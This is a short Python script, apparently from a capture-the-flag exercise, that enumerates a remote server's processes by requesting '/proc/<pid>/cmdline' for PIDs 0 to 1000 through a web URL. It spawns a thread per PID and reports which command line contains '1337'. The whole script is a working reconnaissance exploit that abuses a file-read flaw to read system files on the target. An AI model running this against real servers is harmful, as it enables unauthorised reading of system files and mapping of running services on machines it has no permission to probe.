import requests,sys
import threading



def req(pid, url):
	full = url+"/proc/"+pid+"/cmdline"
	req = requests.get(full).text
	if "1337" in req:
		print("found !\n"+full)
	else:
		print(full+" not found! ")

def enum_service_by_pid(url):
	for num in range(0,1001):
		pid = str(num)
		url = url.strip()
		t1 = threading.Thread(target=req, args=(pid,url,)).start()

enum_service_by_pid(sys.argv[1])
